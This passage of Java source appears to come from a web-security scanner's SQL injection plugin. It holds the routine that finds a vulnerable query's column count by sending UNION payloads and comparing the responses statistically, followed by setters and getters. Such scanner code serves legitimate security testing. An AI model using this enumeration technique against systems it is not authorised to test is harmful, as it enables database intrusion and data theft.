        List<Integer> matchingCols = new ArrayList<>();
        List<Double> ratios = new ArrayList<>();

        if (lowerCount == 1) {
            int found = orderByTechnique();
            if (found >= 0) {
                if (log.isDebugEnabled()) {
                    log.debug("target url appears to have " + found + " column in query");
                }
                return found;
            }
        }

        if (Math.abs(upperCount - lowerCount) < MIN_UNION_RESPONSES) {
            upperCount = lowerCount + MIN_UNION_RESPONSES;
        }

        // Start launching all union payloads
        HttpMessage msg;
        String payload;
        String content;
        double ratio;

        for (int count = lowerCount; count < upperCount + 1; count++) {
            payload = prepareUnionPayload("", -1, count, uChars, null, false, null);
            payload = paramValue + payload;
            msg = plugin.sendPayload(paramName, payload, true);
            if (msg == null) {
                // Probably a Circular Exception occurred
                // exit with no results
                return -1;
            }

            content = msg.getResponseBody().toString();
            content = SQLiPayloadManager.removeReflectiveValues(content, payload);

            if (uChars != null) {
                if (tokenPattern.matcher(content).find()) {
                    matchingCols.add(count);
                }
            }

            ratio = plugin.compareToOriginal(content);
            min = Math.min(min, ratio);
            max = Math.max(max, ratio);

            // remember that now the column number is equal to
            // array index + lowerCount
            ratios.add(ratio);
        }

        if (uChars != null) {
            if (matchingCols.size() == 1) {
                return matchingCols.get(0);
            }
        }

        // Get the minimum column count and the maximum one
        int minItem = 0;
        int maxItem = 0;

        for (int i = 0; i < ratios.size(); i++) {
            if (ratios.get(i) == min) {
                minItem = i + lowerCount;

            } else if (ratios.get(i) == max) {
                maxItem = i + lowerCount;
            }
        }

        // If all are min values then take the maxItem
        int count = 0;
        for (double val : ratios) {
            if (val != min) {
                if ((val == max) && (count < 1)) {
                    count++;

                } else {
                    count = -1;
                    break;
                }
            }
        }

        if (count > 0) {
            return maxItem;
        }

        // If all are max values then take the minItem
        count = 0;
        for (double val : ratios) {
            if (val != max) {
                if ((val == min) && (count < 1)) {
                    count++;

                } else {
                    count = -1;
                    break;
                }
            }
        }

        if (count > 0) {
            return minItem;
        }

        if (Math.abs(max - min) >= MIN_STATISTICAL_RANGE) {
            double deviation = getDeviation(ratios);
            double average = getAverage(ratios);
            double lower = average - UNION_STDEV_COEFF * deviation;
            double upper = average + UNION_STDEV_COEFF * deviation;
            int retVal = -1;

            if (min < lower) {
                retVal = minItem;
            }

            if (max > upper) {
                if ((retVal < 0) || (Math.abs(max - upper) > Math.abs(min - lower))) {
                    retVal = maxItem;
                }
            }

            return retVal;
        }

        return -1;
    }

    // ---------------------------------------------------------
    public void setParamName(String paramName) {
        this.paramName = paramName;
    }

    public void setParamValue(String paramValue) {
        this.paramValue = paramValue;
    }

    public void setPrefix(String prefix) {
        this.prefix = prefix;
    }

    public void setSuffix(String suffix) {
        this.suffix = suffix;
    }

    public void setComment(String comment) {
        this.comment = comment;
    }

    public void setDbms(DBMSHelper dbms) {
        this.dbms = dbms;
    }

    public void setUnionColsStart(int uColsStart) {
        this.uColsStart = uColsStart;
    }

    public void setUnionColsStop(int uColsStop) {
        this.uColsStop = uColsStop;
    }

    public void setUnionChars(String uChars) {
        this.uChars = uChars;
        this.where =
                (uChars == null)
                        ? SQLiPayloadManager.WHERE_ORIGINAL
                        : SQLiPayloadManager.WHERE_NEGATIVE;
    }

    public void setTest(SQLiTest test) {
        this.test = test;
    }

    public HttpMessage getExploitMessage() {
        return exploitMessage;
    }

    public String getExploitPayload() {
        return exploitPayload;
    }

    public int getExploitColumnsCount() {
        return exploitColumnsCount;
    }
}
